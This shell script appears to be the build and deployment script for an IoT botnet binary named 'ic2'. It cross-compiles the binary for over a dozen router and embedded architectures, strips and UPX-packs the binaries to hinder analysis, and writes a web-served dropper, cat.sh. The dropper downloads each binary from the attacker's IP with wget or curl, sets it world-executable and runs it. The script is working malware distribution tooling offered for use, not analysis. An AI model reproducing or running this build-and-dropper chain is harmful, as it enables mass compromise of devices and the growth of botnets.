#!/bin/sh
export PATH=/etc/xcompile/x86_64/bin:/etc/xcompile/powerpc/bin:/etc/xcompile/mips/bin:/etc/xcompile/mipsel/bin:/etc/xcompile/armv4l/bin:/etc/xcompile/armv5l/bin:/etc/xcompile/armv6l/bin:/etc/xcompile/armv7l/bin:/etc/xcompile/sh4/bin:/etc/xcompile/arc/bin:/etc/xcompile/csky-gcc/bin:/etc/xcompile/aarch64/bin:/etc/xcompile/m68k/bin:/etc/xcompile/sparc/bin:/etc/xcompile/i486/bin:$PATH

# build for each arch, note that compilation commands vary from arch to arch
powerpc-gcc *.c -o ic2.powerpc -DARCH_powerpc -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
echo "compiled powerpc"
mips-gcc *.c -o ic2.mips -DARCH_mips -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
echo "compiled mips"
mips-gcc *.c -o ic2.mipsrouter -DKILLER_OFF -DARCH_mipsrouter -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
echo "compiled mipsrouter"
mipsel-gcc *.c -o ic2.mipsel -DARCH_mipsel -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
echo "compiled mipsel"
x86_64-gcc *.c -o ic2.x86_64 -fno-stack-protector -fno-ident -fno-asynchronous-unwind-tables -DARCH_x86_64 -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -s -std=c99 -static
echo "compiled x86_64"
m68k-gcc *.c -o ic2.m68k -DARCH_m68k -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
echo "compiled m68k"
sparc-gcc *.c -o ic2.sparc -DARCH_sparc -lpthread -O3 -fomit-frame-pointer -fdata-sections -std=c99 -static-libgcc
echo "compiled sparc"
i486-gcc *.c -o ic2.i486 -DARCH_i486 -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
echo "compiled i486"
aarch64-linux-gcc *.c -o ic2.aarch64 -fno-stack-protector -fno-ident -fno-asynchronous-unwind-tables -DARCH_aarch64 -pthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
echo "compiled aarch64"
armv4l-gcc *.c -o ic2.armv4l -fno-stack-protector -fno-ident -fno-asynchronous-unwind-tables -DARCH_armv4l -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
echo "compiled armv4l"
armv5l-gcc *.c -o ic2.armv5l -fno-stack-protector -fno-ident -fno-asynchronous-unwind-tables -DARCH_armv5l -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
echo "compiled armv5l"
armv6l-gcc *.c -o ic2.armv6l -fno-stack-protector -fno-ident -fno-asynchronous-unwind-tables -DARCH_armv6l -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
echo "compiled armv6l"
armv7l-gcc *.c -o ic2.armv7l -fno-stack-protector -fno-ident -fno-asynchronous-unwind-tables -DARCH_armv7l -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
echo "compiled armv7l"
sh4-gcc *.c -o ic2.sh4 -DARCH_sh4 -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -s -std=c99 -static
echo "compiled sh4"
arc-linux-gcc *.c -o ic2.arc -DARCH_arc -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
echo "compiled arc"

# strip bins
echo "stripping all bins"
powerpc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ic2.powerpc

mips-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ic2.mips

mipsel-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ic2.mipsel

i486-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ic2.i486

x86_64-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ic2.x86_64

m68k-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ic2.m68k

sparc-strip -S --strip-unneeded ic2.sparc

aarch64-linux-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ic2.aarch64

armv4l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ic2.armv4l

armv5l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ic2.armv5l

armv6l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ic2.armv6l

armv7l-strip -S --strip-unneeded -R .comment -R .note -R .note.gnu.build-id -R .note.gnu.gold-version ic2.armv7l

sh4-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ic2.sh4

arc-linux-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ic2.arc

#compress
echo "compressing a few bins with upx"
upx --lzma ic2.x86_64

upx --lzma ic2.aarch64

upx --lzma ic2.armv4l

upx --lzma ic2.armv5l

upx --lzma ic2.armv6l

upx --lzma ic2.armv7l

upx --lzma ic2.mips

upx --lzma ic2.mipsel

upx --lzma ic2.mipsrouter

#Optional:
# Move binaries to web dir
#mv ic2.* /var/www/html
#cd ..

IP=$(curl -s ifconfig.co)
cat <<EOF >/var/www/html/cat.sh
#!/bin/sh
wget http://$IP/ic2.x86_64 || curl http://$IP/ic2.x86_64 -o ic2.x86_64; chmod 777 ic2.x86_64; ./ic2.x86_64 "$@" ;
wget http://$IP/ic2.aarch64 || curl http://$IP/ic2.aarch64 -o ic2.aarch64; chmod 777 ic2.aarch64; ./ic2.aarch64 "$@" ;
wget http://$IP/ic2.m68k || curl http://$IP/ic2.m68k -o ic2.m68k; chmod 777 ic2.m68k; ./ic2.m68k "$@" ;
wget http://$IP/ic2.mips || curl http://$IP/ic2.mips -o ic2.mips; chmod 777 ic2.mips; ./ic2.mips "$@" ;
wget http://$IP/ic2.mipsel || curl http://$IP/ic2.mipsel -o ic2.mipsel; chmod 777 ic2.mipsel; ./ic2.mipsel "$@" ;
wget http://$IP/ic2.powerpc || curl http://$IP/ic2.powerpc -o ic2.powerpc; chmod 777 ic2.powerpc; ./ic2.powerpc "$@" ;
wget http://$IP/ic2.sparc || curl http://$IP/ic2.sparc -o ic2.sparc; chmod 777 ic2.sparc; ./ic2.sparc "$@" ;
wget http://$IP/ic2.sh4 || curl http://$IP/ic2.sh4 -o ic2.sh4; chmod 777 ic2.sh4; ./ic2.sh4 "$@" ;
wget http://$IP/ic2.arc || curl http://$IP/ic2.arc -o ic2.arc; chmod 777 ic2.arc; ./ic2.arc "$@" ;
wget http://$IP/ic2.i486 || curl http://$IP/ic2.i486 -o ic2.i486; chmod 777 ic2.i486; ./ic2.i486 "$@" ;
wget http://$IP/ic2.armv4l || curl http://$IP/ic2.armv4l -o ic2.armv4l; chmod 777 ic2.armv4l; ./ic2.armv4l "$@" ;
wget http://$IP/ic2.armv5l || curl http://$IP/ic2.armv5l -o ic2.armv5l; chmod 777 ic2.armv5l; ./ic2.armv5l "$@" ;
wget http://$IP/ic2.armv6l || curl http://$IP/ic2.armv6l -o ic2.armv6l; chmod 777 ic2.armv6l; ./ic2.armv6l "$@" ;
wget http://$IP/ic2.armv7l || curl http://$IP/ic2.armv7l -o ic2.armv7l; chmod 777 ic2.armv7l; ./ic2.armv7l "$@" ;
EOF

echo "DONE!"

exit 0
